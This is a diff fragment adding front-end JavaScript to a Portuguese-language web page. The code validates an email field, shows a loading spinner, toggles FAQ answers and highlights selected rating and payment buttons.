+        button.innerHTML = '<span class="loading-spinner"></span> Carregando...';
+        setTimeout(function() {
+            mostrarPagina('inicio');
+        }, 2000);
+    }
+
+    function verificarCampos() {
+        var email = document.getElementById("email").value;
+        var emailValido = /\S+@\S+\.\S+/;
+        if (email === "") {
+            alert("Insira seu e-mail para logar!");
+        } else if (!emailValido.test(email)) {
+            alert("Insira um e-mail válido!");
+        } else {
+            showLoading();
+        }
+    }
+
+    function toggleAnswer(question) {
+        const answer = question.nextElementSibling;
+        answer.classList.toggle("active");
+        const allQuestions = document.querySelectorAll(".question");
+        allQuestions.forEach((otherQuestion) => {
+            if (otherQuestion !== question) {
+                otherQuestion.nextElementSibling.classList.remove("active");
+            }
+        });
+    }
+
+    document.addEventListener('DOMContentLoaded', function () {
+        const containers = document.querySelectorAll('.rating-container');
+        containers.forEach(function (container) {
+            const buttons = container.querySelectorAll('.rating-button');
+            buttons.forEach(function (button) {
+                button.addEventListener('click', function () {
+                    buttons.forEach(function (btn) {
+                        btn.classList.remove('active');
+                    });
+                    button.classList.add('active');
+                });
+            });
+        });
+
+        const payButtons = document.querySelectorAll('#payMethods .square-button');
+        payButtons.forEach(btn => {
+            btn.addEventListener('click', () => {
+                payButtons.forEach(b => b.classList.remove('is-selected'));
+                btn.classList.add('is-selected');
+            });
+        });
+    });
+</script>
+
 </body>
 </html>
